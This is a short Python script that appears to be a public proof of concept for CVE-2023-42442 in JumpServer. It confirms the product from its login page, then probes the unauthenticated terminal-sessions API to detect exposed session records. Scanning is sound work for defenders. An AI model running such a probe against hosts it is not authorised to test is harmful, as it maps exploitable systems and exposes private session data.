# -*- coding: utf-8 -*-
# @Author  : TongMystic
# @Time    : 9/27/2023 7:04 PM
# @Function:
import sys
from urllib.parse import urljoin

import requests


def cve_2023_42442(domain):
    try:
        re = requests.get(urljoin(domain,"/core/auth/login/"))
        if re.status_code == 200 and re.text.find("jumpserver") != -1:
            req = requests.get(urljoin(domain, "/api/v1/terminal/sessions/"))
            if req.status_code == 200:
                if req.text.find("\"id\":") != -1 or req.text.find("[]") != -1:
                    return True
            else:
                return False
    except:
        return False


if __name__ == '__main__':
    if len(sys.argv) > 1:
        domain = sys.argv[1]
    else:
        print("""Help:
                python .\CVE-2023-42442-POC.py <JumpServer_Domain> """)
        sys.exit()
    if cve_2023_42442("http://" + domain):
        print("!!!Find CVE-2023-42442 On " + domain)
    elif cve_2023_42442("https://" + domain):
        print("!!!Find CVE-2023-42442 On " + domain)
    else:
        print("NOT Find CVE-2023-42442 On " + domain)
